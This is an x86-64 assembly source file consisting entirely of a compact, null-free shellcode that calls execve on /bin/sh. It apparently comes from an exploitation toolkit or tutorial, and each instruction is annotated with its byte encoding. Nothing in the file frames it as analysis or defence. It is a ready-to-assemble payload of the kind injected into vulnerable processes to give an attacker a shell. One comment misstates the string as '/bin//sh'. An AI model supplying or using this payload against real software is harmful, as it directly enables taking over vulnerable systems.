    .section .shcode, "ax", @progbits
    .globl _start
    .hidden _start
    .type _start, @function
_start:
    /* 48 bb d1 9d 96 91 d0 8c 97 ff */  movabs  $0xff978cd091969dd1, %rbx
    /* 48 f7 db                      */  neg     %rbx       /* rbx = 0x68732f6e69622f */
    /* 53                            */  push    %rbx
    /* 54                            */  push    %rsp
    /* 5f                            */  pop     %rdi       /* rdi = "/bin//sh" */
    /* 31 c0                         */  xor     %eax, %eax /* rax = 0 */
    /* 99                            */  cltd               /* rdx = 0 */
    /* 52                            */  push    %rdx
    /* 57                            */  push    %rdi
    /* 54                            */  push    %rsp
    /* 5e                            */  pop     %rsi       /* rsi = [rdi, NULL] */
    /* b0 3b                         */  mov     $0x3b, %al /* eax = 59 = __NR_execve */
    /* 0f 05                         */  syscall            /* syscall(eax, rdi, rsi, rdx) */

/* Mark the stack as not executable */
    .section .note.GNU-stack, "", @progbits
